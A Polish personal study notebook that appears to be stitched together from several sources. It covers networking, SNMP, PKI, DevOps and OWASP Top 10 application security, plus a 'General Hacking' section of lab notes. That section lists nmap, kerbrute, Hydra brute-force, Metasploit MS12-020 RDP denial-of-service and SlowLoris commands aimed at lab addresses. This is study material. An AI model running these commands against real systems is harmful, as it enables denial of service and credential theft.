Dostępność wifi na zewnątrz budynku zależy od konfiguracji sieci.
Widoczność ekranów komputerów i terminali z zewnątrz budynku zależy od konfiguracji sieci i stosowanych zabezpieczeń.
Użycie szkła bezpiecznego w biurze również zależy od konfiguracji sieci i wymagań użytkownika.
Sieci dla gości lub sal konferencyjnych mogą być odpowiednio podzielone na segmenty w zależności od konfiguracji sieci.
Główne listy kontroli dostępu (ACL) i reguły zapory w sieci zależą od konfiguracji sieci.
Lokalizacja rozpoznawanego DNS zależy od konfiguracji sieci.
Obrzeża sieci lub strefa zdemilitaryzowana (DMZ) mogą mieć różne funkcje i usługi, w zależności od konfiguracji sieci.
Istnienie zewnętrznych dostawców poczty e-mail lub innych usług w chmurze zależy od konfiguracji sieci.
Architektura dostępu zdalnego lub wirtualnej sieci prywatnej (VPN) również zależy od konfiguracji sieci.


Działąnie Nmapa:  Nmap [24], który skanuje sieć w celu 
określenia znajdujących się w niej hostów, wizualizuje sieć na podstawie liczby przeskoków ze skanera, wykorzystuje Prosty protokół zarządzania siecią (SNMP) do wykrywania i wyświetlania topologii sieci lub korzystania z routera i przełączaj pliki konfiguracyjne, aby szybko generować diagramy sieciowe.

A Sieć SNMP (Simple Network Management Protocol) to protokół stosowany w zarządzaniu siecią komputerową. Jest on powszechnie używany do monitorowania i zarządzania urządzeniami sieciowymi, takimi jak routery, przełączniki, serwery, drukarki itp. Protokół SNMP umożliwia zbieranie informacji o stanie urządzeń, wykrywanie błędów, monitorowanie parametrów sieciowych, konfigurację urządzeń oraz zdalne zarządzanie nimi.

Główne elementy sieci SNMP to:

Zarządca (Manager): To urządzenie lub oprogramowanie, które zbiera informacje od urządzeń zarządzanych, wykonuje zapytania SNMP, monitoruje działanie sieci i podejmuje odpowiednie działania w zależności od otrzymanych danych.
Urządzenie zarządzane (Managed Device): To urządzenie sieciowe, które jest monitorowane i zarządzane za pomocą protokołu SNMP. Może to być router, przełącznik, serwer, drukarka itp.
Agenty (Agents): Są to aplikacje lub moduły zainstalowane na urządzeniach zarządzanych, które zbierają informacje o stanie urządzenia i udostępniają je zarządcy za pomocą protokołu SNMP. Agenty reagują na żądania zarządcy i przekazują informacje o stanie urządzenia.
Sieć SNMP składa się z zestawu zdefiniowanych obiektów zarządzanych (Management Information Base - MIB), które reprezentują różne parametry i właściwości urządzeń sieciowych. Zarządca może odpytywać agenty za pomocą zapytań SNMP, a agenci przesyłają odpowiedzi z informacjami o stanie urządzeń.

Protokół SNMP wykorzystuje hierarchiczną strukturę zarządzania, w której zarządca komunikuje się z agentami za pomocą tzw. PDU (Protocol Data Units), takich jak GetRequest (żądanie odczytu wartości), SetRequest (żądanie zmiany wartości), Trap (powiadomienie o zdarzeniu) itp.

Płyty CD, DVD i Blu-ray to dyski optyczne, które mogą pomieścić

700 MB−5 0  GBdanych i są często używane do dystrybucji muzyki, filmów i oprogramowania do gier. Dyski ROM, takie jak DVD-ROM, są tylko do odczytu, a zapisanych danych nie można zmienić ani nadpisać. Dyski wielokrotnego zapisu, takie jak dyski DVD-RAM, są przeznaczone do odczytu i zapisu, a zapisane dane można zmieniać lub nadpisywać.


Dyski twarde to obracające się dyski magnetyczne, które mogą pomieścić do kilku TB danych. Są często używane jako główna pamięć na komputerach do przechowywania plików i folderów. Szybkość dostępu do danych jest duża w przypadku dostępu sekwencyjnego i zmniejsza się w przypadku dostępu losowego. Dostęp sekwencyjny to odczyt lub zapis z ciągłego fragmentu danych. Dostęp swobodny to odczyt lub zapis z różnych miejsc na dysku.

Co to jest infrastruktura klucza publicznego (PKI) - PKI, czyli infrastruktura 
klucza publicznego, obejmuje wszystko, co służy do ustanowienia szyfrowania klucza publicznego i zarządzania nim. Obejmuje to oprogramowanie, sprzęt, zasady i procedury używane do tworzenia, dystrybucji, zarządzania, przechowywania i unieważniania certyfikatów cyfrowych. 

Certyfikat cyfrowy łączy kryptograficznie klucz publiczny z urządzeniem lub użytkownikiem, który jest jego właścicielem. Pomaga to uwierzytelniać użytkowników i urządzenia oraz zapewniać bezpieczną komunikację cyfrową. 

PKI jest jedną z najpopularniejszych form szyfrowania Internetu i służy do zabezpieczania i uwierzytelniania ruchu między przeglądarkami internetowymi a serwerami internetowymi. Może być również używany do zabezpieczania dostępu do podłączonych urządzeń i komunikacji wewnętrznej w organizacji. 

Infrastruktura klucza publicznego ma długą historię zabezpieczania i uwierzytelniania komunikacji cyfrowej z dwoma głównymi celami : zapewnienie prywatności wysyłanej wiadomości i zweryfikowanie, czy nadawca jest tym, za kogo się podaje.

Co to jest infrastruktura klucza publicznego (PKI)?
Infrastruktura klucza publicznego jest ważnym aspektem bezpieczeństwa w Internecie. Jest to zestaw technologii i procesów, które tworzą ramy szyfrowania w celu ochrony i uwierzytelniania komunikacji cyfrowej. 

PKI wykorzystuje kryptograficzne klucze publiczne, które są połączone z certyfikatem cyfrowym, który uwierzytelnia urządzenie lub użytkownika wysyłającego komunikację cyfrową. Certyfikaty cyfrowe są wydawane przez zaufane źródło, urząd certyfikacji (CA) i działają jak rodzaj cyfrowego paszportu, aby upewnić się, że nadawca jest tym, za kogo się podaje.

Infrastruktura klucza publicznego chroni i uwierzytelnia komunikację między serwerami i użytkownikami, na przykład między Twoją witryną internetową (hostowaną na Twoim serwerze internetowym) a klientami (użytkownikiem próbującym połączyć się za pośrednictwem przeglądarki. Może być również używana do bezpiecznej komunikacji w organizacji, aby zapewnić że wiadomości są widoczne tylko dla nadawcy i odbiorcy i nie zostały naruszone podczas przesyłania. 

Do głównych elementów infrastruktury klucza publicznego należą:

Urząd certyfikacji (CA): Urząd certyfikacji to zaufany podmiot, który wydaje, przechowuje i podpisuje certyfikat cyfrowy. Urząd certyfikacji podpisuje certyfikat cyfrowy własnym kluczem prywatnym, a następnie publikuje klucz publiczny, do którego można uzyskać dostęp na żądanie.
Urząd rejestracji (RA): Urząd certyfikacji weryfikuje tożsamość użytkownika lub urządzenia żądającego certyfikatu cyfrowego. Może to być strona trzecia lub CA może również działać jako RA.  
Baza danych certyfikatów: ta baza danych przechowuje certyfikat cyfrowy i jego metadane, w tym okres ważności certyfikatu.
Katalog centralny: Jest to bezpieczna lokalizacja, w której są indeksowane i przechowywane klucze kryptograficzne.  
System zarządzania certyfikatami: Jest to system zarządzania dostarczaniem certyfikatów oraz dostępem do nich.  
Polityka certyfikacji: Ta polityka określa procedury PKI. Może być używany przez osoby z zewnątrz w celu określenia wiarygodności infrastruktury PKI.

![2f6e4db00fd6de15dad795e5d2d4341b.png](:/1f1df681bf29446ab37ff4f803f164c1)

Pod pojęciem technologii informacyjnych i komunikacyjnych (w skrócie ICT, z ang. information and communication technologies, nazywanych zamiennie technologiami informacyjno-telekomunikacyjnymi, teleinformatycznymi lub technikami informacyjnymi) kryje się rodzina technologii przetwarzających, gromadzących i przesyłających informacje w formie elektronicznej.

Węższym pojęciem są technologie informatyczne (IT), które odnoszą się do technologii związanych z komputerami i oprogramowaniem, nie związanych jednak z technologiami komunikacyjnymi i dotyczącymi sieci. Rozwój tych technologii sprawia, że oba pojęcia stają się coraz bardziej spójne, będący przy tym motorem rozwoju cywilizacyjnego, społecznego i gospodarczego.
(IT - information technology chyba)

**DevOps** odpowiada za kwestie związane z automatyzacją procesów w projekcie m.in. za zorganizowanie środowiska lokalnego, repozytorium kodu, infrastrukturę czy pipeline CI/CD. DevOps to po prostu konkretna rola projektowa i specjalizacja, tak samo jak programista czy tester.

Założę się, że większość z Was spotkała się z określeniem, że “DevOps to kultura”. Oznacza to w gruncie rzeczy, że każdy członek zespołu powinien być w pewnym sensie DevOpsem.

Jednak to nie takie proste.

Umiejętności związane z chmurą, automatyzacją pipeline’ów CI/CD, NAPRAWDĘ DOBRA znajomość narzędzi typu terraform czy Jenkins, dogłębna wiedza o cyklu wytwarzania oprogramowania… To cały zestaw umiejętności, które trzeba nieustannie rozwijać


**Termin DevOps**, powstały z połączenia słów „development” (programowanie) i „operations” (operacje), określa metodykę łączącą ludzi, procesy i technologie, aby umożliwić ciągłe dostarczanie wartości klientom.

Co metodyka DevOps oznacza dla zespołów? Metodyka DevOps umożliwia odrębnym wcześniej rolom — zespołom ds. programowania, operacji IT, inżynierii jakości i zabezpieczeń — koordynowanie i współpracę w celu tworzenia lepszych, bardziej niezawodnych produktów. Stosując kulturę DevOps wraz z narzędziami i praktykami DevOps, zespoły zyskują możliwość lepszego reagowania na potrzeby klientów, zwiększają zaufanie w tworzone aplikacje i szybciej realizują cele biznesowe.

print working directory - pwd (patrzy w jakim katalogu aktualnie jesteś)

https://brilliant.org/courses/#/computer-science#/computer-science


Pliki .dsp i .dsw to pliki projektu i rozwiązania Visual Studio, które zawierają ustawienia i informacje o plikach źródłowych, bibliotekach i narzędziach używanych do budowania aplikacji1.
Pliki .ncb to pliki bazy danych IntelliSense, które przechowują informacje o symbolach i kodzie źródłowym w Visual Studio2.
Pliki .opt to pliki opcji projektu, które zawierają ustawienia środowiska i preferencje użytkownika w Visual Studio2.
Pliki .plg to pliki dziennika kompilacji, które rejestrują wyniki budowania projektu w Visual Studio2.
Pliki .tlh i .tli to pliki nagłówkowe generowane automatycznie przez Visual Studio, które zawierają deklaracje typów i funkcji z bibliotek typów COM3.
Plik .cmd to plik wsadowy, który zawiera polecenia wykonywane przez interpreter poleceń Windows3.


https://pasja-informatyki.pl/sieci-komputerowe/jednostki-danych-w-sieciach/

Ethernet – technika, w której zawarte są standardy wykorzystywane w budowie głównie lokalnych sieci komputerowych. Obejmuje ona specyfikację przewodów oraz przesyłanych nimi sygnałów. Ethernet opisuje również format ramek i protokoły z dwóch najniższych warstw Modelu OSI. Jego pierwotna specyfikacja została podana w standardzie IEEE 802.3.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# General Hacking

Co to jest AD (Active Directory)?
Active Directory obsługuje szereg funkcji, takich jak uwierzytelnianie, zarządzanie grupami i użytkownikami, administrowanie zasadami i wiele innych.
AD może wykorzystywać zarówno protokół Kerberos, jak i LDAP do uwierzytelniania, co czyni go obecnie najczęściej używaną usługą katalogową.

**NMAP**:
* * *-sV do włączenia wykrywania wersji
* * *-sC do uruchamiania z domyślnymi skryptami NSE
* * *-A dla włączenia trybu agresywnego (włącza wykrywanie systemu operacyjnego, wykrywanie wersji, traceroute, skanowanie skryptów)
* * *-T4 do ustawienia szybkości skanowania w trybie 4
* * *-on dla zapisania wyjścia
* `sudo nmap -sV -sC -A -T4 -oN nmap.out 10.10.91.162`
* sudo nmap --open -A -O -Ss IP

LDAP jest podstawowym środkiem komunikacji między usługami katalogowymi a aplikacjami. Jeśli chodzi o konta użytkowników, usługi katalogowe przechowują informacje, takie jak nazwy, hasła i konta komputerów, i przekazują te informacje innym podmiotom sieciowym.

-----------------------------------------------------------------------------
## NARZĘDZIA
**Enum4linux -  to narzędzie do wyliczania informacji z systemów Windows i Samba.
Korzystając z tego narzędzia, możemy zidentyfikować informacje o udostępnianiu, informacje o użytkownikach i grupach użytkowników, informacje DNS, identyfikację zdalnego systemu operacyjnego, cykliczne RID, odzyskiwanie polityki haseł, informacje NetBIOS itp**

KOMENDA ` IP`

`echo "10.10.91.162 spookysec.local" | sudo tee -a /etc/hosts`  
 spooksec to nazwa domeny 10.10 to adres ip atakowanej maszyny reszta komendy to dodanie tej "strony" do /etc/hosts 
 
 WYSZUKIWANIE: ./kerbrute userenum --dc domena-z-nmap-domain-name -d domena-z-nmap-domain-name userlist.txt

Manipulacja bitami to czynność polegająca na manipulowaniu bitami w celu wykrycia błędów (kodu Hamminga), szyfrowania i odszyfrowywania wiadomości

przydatne - https://github.com/foobarto/redteam-notebook
 
 https://github.com/paulsec/awesome-sec-talks

--------------------------------------------------------------------------------------------------
METASPLOIT

CVE-2012-0002 Exploit - 
`use auxiliary/dos/windows/rdp/ms12_020_maxchannelids`
`RHOST IP CELU`
`run`
-----------------------------------------------------------------------------
sudo nmap 10.10.171.213 --script vuln

Powolny atak Loris:
`cd PySlowLoris`
`proxychains python3 src/main.py IP:443`

HYDRA:
hydra -l username -P sql.txt ftp://IP

Możemy również użyć Hydry do bruteforce formularzy internetowych, musisz upewnić się, że wiesz, jakiego typu żądania są tworzone - zwykle używane są metody GET lub POST. Możesz użyć karty sieci przeglądarki (w narzędziach programistycznych), aby zobaczyć typy żądań lub po prostu wyświetlić kod źródłowy.

Poniżej znajduje się przykładowe polecenie Hydra do brutalnego wymuszenia formularza logowania POST:

hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

Co to jest bezpieczeństwo aplikacji?
Bezpieczeństwo aplikacji ma na celu ochronę kodu aplikacji i danych przed zagrożeniami cybernetycznymi. Możesz i powinieneś stosować zabezpieczenia aplikacji we wszystkich fazach rozwoju, w tym projektowania, programowania i wdrażania.

Oto kilka sposobów promowania bezpieczeństwa aplikacji w całym cyklu rozwoju oprogramowania (SDLC):

Wprowadzaj standardy i narzędzia bezpieczeństwa na etapie projektowania i tworzenia aplikacji. Na przykład uwzględnij skanowanie podatności na wczesnym etapie rozwoju.
Implementuj procedury i systemy bezpieczeństwa w celu ochrony aplikacji w środowiskach produkcyjnych. Na przykład wykonuj ciągłe testy bezpieczeństwa.
Zaimplementuj silne uwierzytelnianie dla aplikacji, które zawierają poufne dane lub mają krytyczne znaczenie.
Korzystaj z systemów bezpieczeństwa, takich jak zapory, zapory aplikacji internetowych (WAF) i systemy zapobiegania włamaniom (IPS).
Jakie typy aplikacji musi zabezpieczyć nowoczesna organizacja?
Bezpieczeństwo aplikacji internetowych
Aplikacja internetowa to oprogramowanie działające na serwerze sieciowym i dostępne przez Internet. Klient działa w przeglądarce internetowej. Z natury aplikacje muszą akceptować połączenia od klientów przez niezabezpieczone sieci . Naraża to ich na szereg luk w zabezpieczeniach. Wiele aplikacji internetowych ma kluczowe znaczenie dla działalności biznesowej i zawiera wrażliwe dane klientów, co czyni je cennym celem dla atakujących i ma wysoki priorytet dla każdego programu bezpieczeństwa cybernetycznego .

Ewolucja Internetu zajęła się pewnymi lukami w aplikacjach internetowych – takimi jak wprowadzenie protokołu HTTPS, który tworzy zaszyfrowany kanał komunikacyjny, który chroni przed atakami typu „man in the middle” (MitM). Pozostało jednak wiele luk w zabezpieczeniach. Najpoważniejsze i najczęstsze luki w zabezpieczeniach są udokumentowane przez Open Web Application Security Project (OWASP) w formie OWASP Top 10.

Ze względu na narastający problem bezpieczeństwa aplikacji internetowych, wielu producentów zabezpieczeń wprowadziło rozwiązania zaprojektowane specjalnie do zabezpieczania aplikacji internetowych. Przykładem może być zapora aplikacji internetowej (WAF), narzędzie zabezpieczające zaprojektowane do wykrywania i blokowania ataków w warstwie aplikacji.

Dowiedz się więcej w naszym szczegółowym przewodniku po bezpieczeństwie stron internetowych

Bezpieczeństwo API
Coraz większe znaczenie mają interfejsy programowania aplikacji (API). Stanowią one podstawę nowoczesnych aplikacji mikroserwisowych i powstała cała ekonomia API, która pozwala organizacjom na współdzielenie danych i dostęp do funkcjonalności oprogramowania stworzonego przez innych. Oznacza to, że bezpieczeństwo API ma kluczowe znaczenie dla nowoczesnych organizacji.

API, które cierpią z powodu luk w zabezpieczeniach , są przyczyną poważnych naruszeń bezpieczeństwa danych . Mogą ujawnić wrażliwe dane i spowodować zakłócenia w krytycznych operacjach biznesowych. Częstymi słabościami zabezpieczeń interfejsów API są słabe uwierzytelnianie, niechciane narażenie danych i brak ograniczenia szybkości, co umożliwia nadużycia interfejsu API.

Podobnie jak bezpieczeństwo aplikacji internetowych, potrzeba bezpieczeństwa API doprowadziła do rozwoju wyspecjalizowanych narzędzi, które mogą identyfikować luki w API i zabezpieczać API w środowisku produkcyjnym.

Dowiedz się więcej ze szczegółowego przewodnika po zabezpieczeniach API

Bezpieczeństwo aplikacji natywnych w chmurze
Aplikacje natywne dla chmury to aplikacje zbudowane w architekturze mikrousług przy użyciu technologii takich jak maszyny wirtualne, kontenery i platformy bezserwerowe. Zabezpieczenia natywne w chmurze to złożone wyzwanie, ponieważ aplikacje natywne dla chmury mają dużą liczbę ruchomych części i komponentów, które mają tendencję do bycia efemerycznych — często rozbieranych i zastępowanych przez inne. Utrudnia to uzyskanie wglądu w natywne środowisko chmury i zapewnienie bezpieczeństwa wszystkich komponentów.

W aplikacjach natywnych dla chmury infrastruktura i środowiska są zazwyczaj konfigurowane automatycznie w oparciu o konfigurację deklaratywną — nazywa się to infrastrukturą jako kodem (IaC). Deweloperzy są odpowiedzialni za tworzenie konfiguracji deklaratywnych i kodu aplikacji, a oba te elementy powinny podlegać względom bezpieczeństwa. Przesunięcie w lewo jest znacznie ważniejsze w środowiskach natywnych dla chmury, ponieważ prawie wszystko jest ustalane na etapie rozwoju.

Aplikacje natywne dla chmury mogą korzystać z tradycyjnych narzędzi testowych, ale te narzędzia nie wystarczą. Potrzebne są dedykowane narzędzia bezpieczeństwa natywne dla chmury, które są w stanie oprzyrządować kontenery, klastry kontenerów i funkcje bezserwerowe, zgłaszać problemy z bezpieczeństwem i zapewniać szybką pętlę informacji zwrotnych dla programistów.

Innym ważnym aspektem bezpieczeństwa natywnego w chmurze jest automatyczne skanowanie wszystkich artefaktów na wszystkich etapach cyklu rozwoju. Co najważniejsze, organizacje muszą skanować obrazy kontenerów na wszystkich etapach procesu rozwoju.

Dowiedz się więcej w szczegółowych przewodnikach do:

Architektura kontenerowa
Architektura bezserwerowa
Zagrożenia bezpieczeństwa aplikacji
Zagrożenia bezpieczeństwa aplikacji internetowych: OWASP Top 10
Aplikacje mogą być narażone na wiele zagrożeń. Lista Top 10 Open Web Application Security Project (OWASP) zawiera krytyczne zagrożenia aplikacji, które najprawdopodobniej wpłyną na aplikacje w środowisku produkcyjnym.

Uszkodzona kontrola dostępu
Uszkodzona kontrola dostępu umożliwia zagrożeniom i użytkownikom uzyskanie nieautoryzowanego dostępu i uprawnień. Oto najczęstsze problemy:

Umożliwia atakującym uzyskanie nieautoryzowanego dostępu do kont użytkowników i działanie jako administratorzy lub zwykli użytkownicy.
Zapewnia użytkownikom nieautoryzowane funkcje uprzywilejowane.
Możesz rozwiązać ten problem, wdrażając silne mechanizmy dostępu, które zapewniają, że każda rola jest jasno zdefiniowana z izolowanymi uprawnieniami.

Błędy kryptograficzne
Awarie kryptograficzne (wcześniej określane jako „narażenie danych wrażliwych”) występują, gdy dane nie są odpowiednio chronione podczas przesyłania i przechowywania. Może ujawniać hasła, dokumentację medyczną, numery kart kredytowych i dane osobowe.

To zagrożenie bezpieczeństwa aplikacji może prowadzić do nieprzestrzegania przepisów dotyczących prywatności danych, takich jak Ogólne rozporządzenie o ochronie danych UE (RODO) oraz standardów finansowych, takich jak PCI Data Security Standards (PCI DSS).

Wstrzyknięcie (w tym XSS, LFI i wstrzyknięcie SQL)
Luki w zabezpieczeniach wstrzykiwane umożliwiają cyberprzestępcom wysyłanie złośliwych danych do interpretera aplikacji internetowych. Może to spowodować kompilację i wykonanie tych danych na serwerze. Wstrzykiwanie SQL jest powszechną formą wstrzykiwania .

Dowiedz się więcej w szczegółowych przewodnikach do:

Skrypty między witrynami (XSS)
Wstrzykiwanie pliku lokalnego (LFI)
Wstrzyknięcie SQL (SQLi)
Fałszowanie żądań między witrynami (CSRF)
Niepewny projekt
Niepewny projekt obejmuje wiele słabości aplikacji, które występują z powodu nieskutecznych lub brakujących kontroli bezpieczeństwa. Aplikacje, które nie mają podstawowych mechanizmów kontroli bezpieczeństwa, które są w stanie stawić czoła krytycznym zagrożeniom. Chociaż można naprawić wady implementacji w aplikacjach z bezpiecznym projektem, nie jest możliwe naprawienie niezabezpieczonego projektu za pomocą odpowiedniej konfiguracji lub środków zaradczych.

Błędna konfiguracja zabezpieczeń (w tym XXE)
Błędy w konfiguracji zabezpieczeń występują z powodu braku wzmocnienia zabezpieczeń w stosie aplikacji. Oto typowe błędy konfiguracji zabezpieczeń:

Nieprawidłowa konfiguracja uprawnień do usług w chmurze
Pozostawienie włączonych lub zainstalowanych niepotrzebnych funkcji
Korzystanie z domyślnych haseł lub kont administratora
Luki w zabezpieczeniach zewnętrznych jednostek XML (XXE)
Dowiedz się więcej ze szczegółowego przewodnika po zewnętrznych jednostkach XML (XXE)

Podatne i przestarzałe komponenty
Podatne i nieaktualne składniki (wcześniej określane jako „używające składników ze znanymi lukami”) obejmują wszelkie luki wynikające z nieaktualnego lub nieobsługiwanego oprogramowania. Może wystąpić, gdy tworzysz lub używasz aplikacji bez wcześniejszej znajomości jej wewnętrznych składników i wersji.

Błędy identyfikacji i uwierzytelniania
Błędy identyfikacji i uwierzytelniania (wcześniej określane jako „uszkodzone uwierzytelnianie”) obejmują wszelkie problemy z bezpieczeństwem związane z tożsamościami użytkowników. Możesz chronić się przed atakami na tożsamość i exploitami, ustanawiając bezpieczne zarządzanie sesjami oraz konfigurując uwierzytelnianie i weryfikację dla wszystkich tożsamości.

Awarie oprogramowania i integralności danych
Awarie oprogramowania i integralności danych występują, gdy infrastruktura i kod są podatne na naruszenia integralności. Może wystąpić podczas aktualizacji oprogramowania, modyfikacji poufnych danych i wszelkich zmian potoku CI/CD, które nie zostały zweryfikowane. Niezabezpieczone potoki CI/CD mogą skutkować nieautoryzowanym dostępem i prowadzić do ataków w łańcuchu dostaw.

Rejestrowanie bezpieczeństwa i monitorowanie awarii
Awarie rejestrowania i monitorowania zabezpieczeń (wcześniej określane jako „niewystarczające rejestrowanie i monitorowanie”) występują, gdy słabości aplikacji nie mogą prawidłowo wykryć zagrożeń bezpieczeństwa i na nie reagować. Logowanie i monitorowanie mają kluczowe znaczenie dla wykrywania naruszeń. Gdy te mechanizmy nie działają, utrudnia to widoczność aplikacji oraz zagraża alarmom i informacjom śledczym.

Fałszerstwo żądania po stronie serwera
Luki w zabezpieczeniach związane z fałszowaniem żądań po stronie serwera (SSRF) występują, gdy aplikacja sieci Web nie sprawdza poprawności adresu URL wprowadzonego przez użytkownika przed pobraniem danych ze zdalnego zasobu. Może mieć wpływ na serwery chronione zaporą ogniową i dowolną listę kontroli dostępu do sieci (ACL), która nie weryfikuje adresów URL.

Dowiedz się więcej w szczegółowym przewodniku po SSRF

Dowiedz się o dodatkowych zagrożeniach cybernetycznych z naszego przewodnika po cyberatakach

Zagrożenia bezpieczeństwa API: OWASP Top 10
Interfejsy API umożliwiają komunikację między różnymi częściami oprogramowania. Aplikacje z interfejsami API umożliwiają zewnętrznym klientom żądanie usług z aplikacji. Interfejsy API są narażone na różne zagrożenia i luki w zabezpieczeniach. OWASP skompilował listę, w której określono priorytety 10 najważniejszych zagrożeń bezpieczeństwa API.

Autoryzacja na poziomie uszkodzonych obiektów
Interfejsy API często ujawniają punkty końcowe obsługujące identyfikatory obiektów. Tworzy to szerszą powierzchnię ataku, problem kontroli dostępu na poziomie. Zamiast tego należy sprawdzić autoryzację na poziomie obiektu w każdej funkcji, która może uzyskać dostęp do źródła danych za pośrednictwem danych wejściowych użytkownika.

Uszkodzone uwierzytelnianie użytkownika
Nieprawidłowo zaimplementowane mechanizmy uwierzytelniania mogą zapewnić nieautoryzowany dostęp złośliwym podmiotom. Umożliwia atakującym wykorzystanie luki w implementacji lub złamanie zabezpieczeń tokenów uwierzytelniania . Gdy to nastąpi, osoby atakujące mogą na stałe lub tymczasowo przyjąć legalną tożsamość użytkownika. W rezultacie zdolność systemu do identyfikacji klienta lub użytkownika jest zagrożona, co zagraża ogólnemu bezpieczeństwu API aplikacji.

Nadmierna ekspozycja na dane
Implementacje ogólne często prowadzą do ujawnienia wszystkich właściwości obiektu bez uwzględniania indywidualnej wrażliwości każdego obiektu. Występuje, gdy programiści polegają na klientach w celu filtrowania danych przed wyświetleniem informacji użytkownikowi.

Brak zasobów i ograniczenie szybkości
Interfejsy API zwykle nie nakładają ograniczeń na liczbę lub rozmiar zasobów, o które może poprosić klient lub użytkownik. Jednak ten problem może wpłynąć na wydajność serwera API i spowodować odmowę usługi (DoS). Dodatkowo może tworzyć luki w uwierzytelnianiu, które umożliwiają ataki typu brute force.

Autoryzacja złamanego poziomu funkcji
Luki autoryzacji umożliwiają atakującym uzyskanie nieautoryzowanego dostępu do zasobów legalnych użytkowników lub uzyskanie uprawnień administracyjnych. Może wystąpić w wyniku nadmiernie skomplikowanych polityk kontroli dostępu opartych na różnych hierarchiach, rolach, grupach oraz niejasnym rozdzieleniu funkcji zwykłych i administracyjnych.

Zadanie masowe
Przypisanie masowe jest zwykle wynikiem nieprawidłowego powiązania danych dostarczonych przez klientów, takich jak JSON, z modelami danych. Występuje, gdy wiązanie odbywa się bez użycia filtrowania właściwości na podstawie listy dozwolonych. Umożliwia atakującym odgadnięcie właściwości obiektu, przeczytanie dokumentacji, zbadanie innych punktów końcowych interfejsu API lub dostarczenie dodatkowych właściwości obiektu w celu żądania ładunku.

Błędna konfiguracja zabezpieczeń
Błędna konfiguracja zabezpieczeń zwykle występuje z powodu:

Niebezpieczne konfiguracje domyślne
Otwórz magazyn w chmurze
Konfiguracje ad hoc lub niekompletne
Błędnie skonfigurowane nagłówki HTTP
Permisywne udostępnianie zasobów między źródłami (CORS)
Niepotrzebne metody HTTP
Szczegółowe komunikaty o błędach zawierające poufne informacje
Zastrzyk
Błędy wstrzykiwania, takie jak wstrzykiwanie poleceń, wstrzykiwanie SQL i wstrzykiwanie NoSQL, występują, gdy zapytanie lub polecenie wysyła niezaufane dane do interpretera. Są to zazwyczaj złośliwe dane, które próbują nakłonić tłumacza do zapewnienia nieautoryzowanego dostępu do danych lub wykonania niezamierzonych poleceń.

Niewłaściwe zarządzanie aktywami
Interfejsy API zwykle udostępniają więcej punktów końcowych niż tradycyjne aplikacje internetowe. Ten charakter interfejsów API oznacza, że ​​właściwa i zaktualizowana dokumentacja staje się kluczowa dla bezpieczeństwa. Ponadto odpowiedni wykaz hostów i wdrożonych wersji interfejsu API może pomóc złagodzić problemy związane z ujawnionymi punktami końcowymi debugowania i przestarzałymi wersjami interfejsu API.

Niewystarczające rejestrowanie i monitorowanie
Niewystarczające rejestrowanie i monitorowanie umożliwia cyberprzestępcom eskalację swoich ataków, zwłaszcza gdy nie ma skutecznej integracji z reagowaniem na incydent lub nie jest ona zintegrowana . Umożliwia złośliwym podmiotom zachowanie trwałości i przechodzenie do innych systemów, w których wydobywają, niszczą lub manipulują danymi.

Co to jest testowanie bezpieczeństwa aplikacji?
Testowanie bezpieczeństwa aplikacji (AST) to proces zwiększania odporności aplikacji na zagrożenia bezpieczeństwa poprzez identyfikowanie i usuwanie luk w zabezpieczeniach.

Początkowo AST był procesem ręcznym. W nowoczesnych, szybkich procesach rozwoju AST musi być zautomatyzowany. Zwiększona modułowość oprogramowania dla przedsiębiorstw, liczne komponenty open source oraz duża liczba znanych luk w zabezpieczeniach i wektorów zagrożeń sprawiają, że automatyzacja jest niezbędna. Większość organizacji używa kombinacji narzędzi bezpieczeństwa aplikacji do prowadzenia AST.

Kluczowe uwagi przed testowaniem aplikacji

Oto kluczowe kwestie, które należy wziąć pod uwagę, zanim będzie można prawidłowo przetestować aplikacje pod kątem luk w zabezpieczeniach:

Utwórz kompletny spis swoich aplikacji.
Poznaj zastosowania biznesowe, wpływ i wrażliwość swoich aplikacji.
Określ, które aplikacje chcesz przetestować — zacznij od systemów dostępnych publicznie, takich jak aplikacje internetowe i mobilne.
Jak testować

Aby pomyślnie przetestować aplikacje pod kątem luk w zabezpieczeniach, musisz określić następujące parametry:

Testowanie uwierzytelnione a testowanie nieuwierzytelnione — można testować aplikacje z perspektywy osoby postronnej (podejście typu „czarna skrzynka”). Jednak przeprowadzanie uwierzytelnionych testów ma dużą wartość, aby wykryć problemy z bezpieczeństwem, które mają wpływ na uwierzytelnionych użytkowników. Może to pomóc w wykryciu luk w zabezpieczeniach, takich jak wstrzykiwanie SQL i manipulacja sesją.
Które narzędzia należy użyć — testowanie powinno w idealnym przypadku obejmować narzędzia, które mogą identyfikować luki w kodzie źródłowym, narzędzia, które mogą testować aplikacje pod kątem słabych punktów bezpieczeństwa w czasie wykonywania, oraz skanery luk w zabezpieczeniach sieci.
Testowanie produkcji a etapowanie — testowanie w środowisku produkcyjnym jest ważne, ponieważ pozwala zidentyfikować problemy z bezpieczeństwem, które obecnie zagrażają organizacji i jej klientom. Jednak testowanie produkcyjne może mieć wpływ na wydajność. Testowanie w stagingu jest łatwiejsze do osiągnięcia i pozwala na szybszą naprawę luk w zabezpieczeniach.
Niezależnie od tego, czy wyłączyć systemy bezpieczeństwa podczas testowania — w przypadku większości testów bezpieczeństwa dobrym pomysłem jest wyłączenie zapór ogniowych, zapór sieciowych aplikacji internetowych (WAF) i systemów zapobiegania włamaniom (IPS) lub przynajmniej dodanie adresów IP narzędzi testowych do białej listy, w przeciwnym razie narzędzia mogą zakłócać skanowanie. Jednak w pełnym teście penetracyjnym narzędzia należy pozostawić włączone, a celem jest skanowanie aplikacji bez wykrycia.
Kiedy testować — zazwyczaj zaleca się przeprowadzanie testów bezpieczeństwa w okresach wyłączenia, aby uniknąć wpływu na wydajność i niezawodność aplikacji produkcyjnych.
Co raportować — wiele narzędzi bezpieczeństwa dostarcza bardzo szczegółowe raporty dotyczące ich określonej domeny testowej, a raporty te nie są przeznaczone do użytku przez ekspertów spoza dziedziny bezpieczeństwa. Zespoły ds. bezpieczeństwa powinny wydobywać najistotniejsze spostrzeżenia z automatycznych raportów i przedstawiać je w znaczący sposób zainteresowanym stronom.
Testy walidacyjne — krytyczną częścią testów bezpieczeństwa jest sprawdzenie, czy działania naprawcze zostały wykonane pomyślnie. Deweloper nie wystarczy, aby powiedział, że naprawa została naprawiona. Musisz ponownie przeprowadzić test i upewnić się, że usterka już nie istnieje, lub w inny sposób przekazać opinię programistom.
